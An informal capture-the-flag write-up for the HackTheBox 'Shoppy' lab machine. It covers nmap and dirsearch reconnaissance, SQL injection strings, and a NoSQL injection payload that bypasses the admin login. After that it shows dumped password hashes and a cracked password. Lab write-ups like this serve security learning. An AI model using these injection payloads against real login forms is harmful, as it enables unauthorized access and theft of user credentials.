target domain: http://shoppy.htb
target IP: 10.10.11.180

now we know the target ip.
let's gather some info using some tool or technique.

>> scanning using nmap.
--> nmap -sC -sV 10.10.11.180 -O
 to see the report.
open port      service name 		service version
22 			Open SSH 		
80			Http			Nginx 1.23.1

>> find directory of this website.
--> using dirsearch.
    ..> /login
    ..> /login/

let's try to go to this directory.
when we go to /login/ dir there are a login form.

let's try some SQL code.
----> admin' OR '1=1'
----> administrator'--
----> admin'OR'1=1'--

but they show the 504 gateway timeout Nginx 1.23.1 error.

ok now let's try to find out the other bug.

Ok let's try to use NoSql Code.

What is No Sql ?
>> NoSQL injection occurs when a query, most commonly delivered by an end-user, is not sanitized, 
allowing the attacker to include malicious input that executes an unwanted command on the database.

ok now let's try some code.'
		i found some NosQl Code On  Internet.
----> Username: admin'||'1==1
----> Pass: admin

when i put this code i am in the admin pannel.
and i search admin.
----> when i search admin. the shoopy site outomatic show. the id username or password.
-iD: "62db0e93d6d6a999a66ee67a"
username: "admin"
password: "23c6877d9e2b564ef8b32c3a23de27b2"

_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"

username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995" = remembermethisway
ok the username is plain text that good . but the password is hash format let's crack it.

i am using google website to crack the password.
---> remembermethisway
